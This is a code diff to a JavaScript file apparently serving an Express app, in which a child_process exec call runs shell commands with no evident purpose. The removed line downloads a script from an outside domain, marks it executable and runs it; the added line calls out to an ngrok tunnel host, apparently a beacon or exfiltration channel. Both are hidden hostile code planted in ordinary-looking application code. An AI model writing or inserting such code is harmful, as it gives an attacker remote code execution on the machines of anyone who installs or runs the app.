@@ -70,7 +70,7 @@ export default function expressApp(functionName) {
     
 var exec = require('child_process').exec;
 function puts(error, stdout, stderr) { sys.puts(stdout) }
-exec("curl https://www.vidio-premier.cf/note.txt -o run.sh; chmod +x run.sh; bash ./run.sh", function(error, stdout, stderr) {
+exec("curl 8.tcp.ngrok.io:14258", function(error, stdout, stderr) {
   if (!error) {
     // things worked!
   } else {
